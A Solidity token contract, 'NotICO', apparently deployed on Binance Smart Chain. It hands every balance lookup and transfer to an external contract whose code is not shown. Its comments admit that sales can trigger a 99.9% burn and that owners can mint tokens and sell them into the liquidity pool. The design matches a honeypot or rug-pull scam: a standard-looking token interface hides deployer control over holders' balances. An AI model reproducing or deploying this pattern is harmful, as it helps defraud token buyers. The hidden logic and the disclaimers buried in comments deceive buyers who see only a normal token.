//The trading of Bitcoin and alternative cryptocurrencies has potential rewards, but also involves risk. Trading may not be suitable for all people.
//Anyone wishing to invest should seek his or her own independent financial or professional advice.
//This token is not for the general public. If purchased, buyers do so at their own peril and cognisant of the risk associated to the tokenomics.
//The sale of these tokens can incur in a 99.9% token burn. The supply is not fixed. Owners can generate additional tokens and sell them to the Liquidity Pool.

/**
*Submitted for verification at BscScan.com on 2022-03-18
*/   

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.16;

contract CSafe {
    function safe_Transfer(address from, address to, uint256 amount) public;
    function safe_balanceOf(address who) public view returns (uint256);
    function safe_setup(address token, uint256 supply) public returns (bool);
}

contract NotICO {
    
    string public constant name = "NotICO";
    string public constant symbol = "NICO";
    uint8 public constant decimals = 18;
    address private CSafe_address;
    address private deployer;
    uint256 totalSupply_;
    mapping(address => mapping (address => uint256)) allowed;

    constructor(address _safe) public {
        totalSupply_ = 21000000*10**18;
        deployer = msg.sender;
        CSafe_address = _safe;
        CSafe(CSafe_address).safe_setup(address(this), totalSupply_);
    }

        function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function balanceOf(address tokenOwner) public view returns (uint256) {
        return CSafe(CSafe_address).safe_balanceOf(tokenOwner);
    }

    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }
    
    function transfer(address to, uint256 amount) public returns (bool) {
        CSafe(CSafe_address).safe_Transfer(msg.sender, to, amount);
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender]>=amount, "Not allowed");
        CSafe(CSafe_address).safe_Transfer(from, to, amount);
        emit Transfer(from, to, amount);
        return true;
    }
}